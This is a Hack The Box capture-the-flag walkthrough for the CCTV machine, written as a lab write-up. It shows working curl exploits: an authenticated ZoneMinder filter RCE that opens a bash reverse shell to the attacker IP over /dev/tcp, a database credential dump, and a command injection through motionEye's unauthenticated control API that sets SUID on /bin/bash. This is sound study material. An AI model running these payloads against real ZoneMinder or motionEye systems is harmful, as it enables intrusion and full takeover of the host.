# CCTV.htb — Step-by-Step Walkthrough

**Target IP:** 10.129.2.55
**Attacker IP:** 10.10.14.241
**Difficulty:** Medium
**Platform:** Hack The Box (Authorized Pentest)

---

# 1. Initial Reconnaissance

We begin with an Nmap scan to identify open ports and services.

```bash
nmap -sC -sV -oN nmap_cctv.txt 10.129.2.55
```

### Results

```
Port 22: SSH (OpenSSH 9.6p1)
Port 80: HTTP (Apache 2.4.58)
```

Navigating to:

```
http://10.129.2.55/
```

Reveals a **ZoneMinder CCTV monitoring system** located at:

```
/zm
```

---

# 2. Web Exploitation (ZoneMinder)

The web application is running:

```
ZoneMinder v1.37.63
```

This version is vulnerable to **Filter-based authenticated Remote Code Execution (RCE).**

---

# Authentication & Session Priming

ZoneMinder enforces **CSRF protection**, so we must first authenticate and obtain a valid session cookie.

### Capture Login Page CSRF Token

```bash
# Capture login page CSRF token
L_CSRF=$(curl -s -c cookies.txt --resolve cctv.htb:80:10.129.2.55 \
"http://cctv.htb/zm/index.php?view=login" \
| grep -oP "__csrf_magic' value=\"\K[^\"]+")
```

### Login Using Default Credentials

```bash
# Login as admin:admin
curl -s -b cookies.txt -c cookies.txt --resolve cctv.htb:80:10.129.2.55 \
-X POST "http://cctv.htb/zm/index.php" \
--data-urlencode "view=login" \
--data-urlencode "action=login" \
--data-urlencode "__csrf_magic=$L_CSRF" \
--data-urlencode "username=admin" \
--data-urlencode "password=admin"
```

---

# Capturing Filter CSRF Token

Once authenticated, we access the filter page to obtain a new CSRF token.

```bash
CSRF=$(curl -s -b cookies.txt --resolve cctv.htb:80:10.129.2.55 \
"http://cctv.htb/zm/?view=filter" \
| grep -oP "__csrf_magic' value=\"\K[^\"]+")

echo "Captured CSRF: $CSRF"
```

---

# Executing the Reverse Shell

We inject a reverse shell through the **AutoExecuteCmd** parameter.

### Start Listener

```bash
nc -lvnp 4444
```

### Trigger RCE

```bash
curl -s -b cookies.txt --resolve cctv.htb:80:10.129.2.55 -X POST \
"http://cctv.htb/zm/?view=filter&action=execute" \
--data-urlencode "__csrf_magic=$CSRF" \
--data-urlencode "filter[Name]=pwn" \
--data-urlencode "filter[Query][terms][0][attr]=Id" \
--data-urlencode "filter[Query][terms][0][op]=>=" \
--data-urlencode "filter[Query][terms][0][val]=0" \
--data-urlencode "filter[AutoExecute]=1" \
--data-urlencode "filter[AutoExecuteCmd]=bash -c 'bash -i >& /dev/tcp/10.10.14.241/4444 0>&1'" \
--data-urlencode "filter[Background]=1"
```

A reverse shell should connect back as:

```
www-data
```

---

# 3. Lateral Movement (User: mark)

After gaining shell access, we enumerate the local database.

## Extract Database Credentials

```bash
cat /etc/zm/zm.conf | grep ZM_DB
```

## Dump the Users Table

```bash
mysql -u zmuser -pzmpass -D zm -e 'select Username,Password from Users;'
```

A password hash for user **mark** is discovered.

After cracking the hash:

```
Password: opensesame
```

---

# SSH Pivot

Using the recovered credentials:

```bash
ssh mark@10.129.2.55
```

```
Password: opensesame
```

---

# 4. Privilege Escalation (Root)

While enumerating the system as **mark**, we discover:

```
/home/sa_mark
```

Additionally, a **motionEye service** is running locally on:

```
Port 7999 — Control API
Port 8765 — Web Interface
```

---

# Vulnerability Analysis

The motion control API on **port 7999** is **unauthenticated**.

Inspecting the configuration:

```bash
/etc/motioneye/camera-1.conf
```

Shows that the service executes a script via:

```
on_event_start
```

This service runs as **root** to interact with camera drivers.

The parameter:

```
snapshot_filename
```

Is passed to a shell command without proper sanitization, allowing **command injection**.

---

# Exploitation

We inject a payload to set the **SUID bit on /bin/bash**.

### Inject Payload

```bash
python3 -c "import urllib.request; urllib.request.urlopen('http://127.0.0.1:7999/1/config/set?snapshot_filename=%24(chmod%20u%2bs%20/bin/bash)')"
```

### Trigger Snapshot

```bash
python3 -c "import urllib.request; urllib.request.urlopen('http://127.0.0.1:7999/1/action/snapshot')"
```

---

# Verify SUID Bash

```bash
ls -l /bin/bash
```

Result:

```
-rwsr-xr-x
```

---

# Escalate to Root

```bash
/bin/bash -p
```

Root shell obtained.

---

# 5. Flags

## User Flag

```bash
cat /home/sa_mark/user.txt
```

```
<REDACTED_USER_FLAG>
```

---

## Root Flag

```bash
cat /root/root.txt
```

```
<REDACTED_ROOT_FLAG>
```

---

# Summary

| Stage                | Method                          |
| -------------------- | ------------------------------- |
| Reconnaissance       | Nmap scanning                   |
| Initial Access       | ZoneMinder Filter RCE           |
| Lateral Movement     | Database credential extraction  |
| Pivot                | SSH login as mark               |
| Privilege Escalation | motionEye API command injection |

---

**Date:** 2026-03-07
**Machine:** CCTV.htb
